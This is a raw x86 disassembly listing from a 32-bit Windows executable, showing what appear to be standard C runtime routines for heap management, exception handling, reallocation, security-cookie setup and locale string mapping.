  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
